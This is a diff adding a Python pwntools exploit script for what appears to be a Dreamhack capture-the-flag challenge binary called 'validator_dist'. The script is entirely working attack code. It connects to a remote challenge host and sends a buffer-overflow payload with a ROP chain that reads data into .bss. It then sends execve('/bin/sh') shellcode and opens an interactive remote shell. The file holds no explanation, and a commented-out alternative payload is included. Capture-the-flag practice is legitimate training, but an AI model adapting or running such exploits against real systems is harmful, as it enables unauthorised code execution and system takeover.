@@ -1,0 +1,75 @@
+from pwn import *
+from Crypto.Util.number import long_to_bytes
+
+
+'''
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : Partial
+'''
+
+r = remote("host1.dreamhack.games", 15233)
+
+shellcode64 = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
+
+# r = process("./validator_dist")
+
+e = ELF("./validator_dist")
+
+pop_rsi_r15_ret = 0x004006f1
+pop_rdi_ret = 0x004006f3
+pop_rdx_ret = 0x0040057b
+ret = 0x0040044e
+main = 0x000000000040063a
+
+payload  = b""
+payload += b"DREAMHACK!"
+
+lst = []
+for i in range(118,0,-1):
+    lst.append(i)
+payload += bytearray(lst)
+
+payload += p64(0)
+payload += p64(pop_rsi_r15_ret)
+payload += p64(e.bss()) # 0x60104b
+payload += p64(0)
+payload += p64(pop_rdi_ret)
+payload += p64(0)
+payload += p64(pop_rdx_ret)
+payload += p64(0x50)
+payload += p64(e.plt['read'])
+payload += p64(e.bss())
+
+pause()
+r.sendline(payload)
+pause()
+
+
+sleep(0.5)
+
+r.sendline(shellcode64)
+
+'''
+sleep(0.5)
+payload  = b""
+payload += b"DREAMHACK!"
+
+lst = []
+for i in range(118,0,-1):
+    lst.append(i)
+payload += bytearray(lst)
+
+payload += p64(0)
+payload += p64(ret)
+
+payload += p64(e.bss())
+
+sleep(0.5)
+
+r.sendline(payload)
+'''
+r.interactive()
+
